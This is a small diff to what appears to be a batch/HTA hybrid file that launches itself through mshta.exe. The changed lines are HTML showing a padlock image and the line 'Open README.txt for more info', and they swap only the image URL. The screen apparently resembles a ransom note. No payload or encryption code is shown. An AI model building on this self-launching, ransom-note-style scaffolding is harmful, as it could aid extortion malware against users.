@@ -33,7 +33,7 @@ for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"
     <br><br>
    Open README.txt for more info.<br>
     <br><br><br>
-    <img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100">
+    <img id="imagen" alt="Candado" src="https://i.imgur.com/t8UbO1s.png" height="130" width="100">
 </div>
 </body>
 </html>
